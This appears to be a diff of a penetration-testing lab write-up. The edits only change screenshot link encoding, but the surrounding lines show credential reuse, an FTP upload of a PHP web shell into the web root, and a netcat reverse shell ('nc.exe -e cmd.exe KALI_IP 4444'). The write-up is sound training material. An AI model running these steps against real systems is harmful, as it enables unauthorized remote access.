@@ -44,7 +44,7 @@ Anonymous login attempts initially failed.
 #### Port 242 (HTTP Web Server)
 Navigating to `http://$IP:242/` in a web browser prompts for HTTP Basic Authentication:
 
-![Screenshot](../../attachments/Pasted%20image%2020260827091349.png)
+![Screenshot](../../attachments/Pasted image 20260827091349.png)
 
 ---
 
@@ -105,7 +105,7 @@ Recovered credentials: `offsec:elite`
 
 Authenticating with `offsec:elite` against `http://$IP:242/` displays a blank PHP page:
 
-![Screenshot](../../attachments/Pasted%20image%2020260827095606.png)
+![Screenshot](../../attachments/Pasted image 20260827095606.png)
 
 Because the FTP `admin` session has write permissions inside the Apache web root (`C:\wamp\www`), files uploaded over FTP are immediately accessible through the web browser.
 
@@ -117,7 +117,7 @@ ftp> put test.txt
 
 Navigate to `http://$IP:242/test.txt`:
 
-![Screenshot](../../attachments/Pasted%20image%2020260827100558.png)
+![Screenshot](../../attachments/Pasted image 20260827100558.png)
 
 The file is served successfully.
 
@@ -128,7 +128,7 @@ The file is served successfully.
    ```
 
 2. Confirm command execution via HTTP:
-   ![Screenshot](../../attachments/Pasted%20image%2020260827101106.png)
+   ![Screenshot](../../attachments/Pasted image 20260827101106.png)
 
 3. Upload `nc.exe` via FTP to the web root.
 
@@ -142,7 +142,7 @@ The file is served successfully.
    http://192.168.x.x:242/cmd.php?cmd=nc.exe -e cmd.exe KALI_IP 4444
    ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260827102038.png)
+![Screenshot](../../attachments/Pasted image 20260827102038.png)
 
 Connection received:
 ```cmd
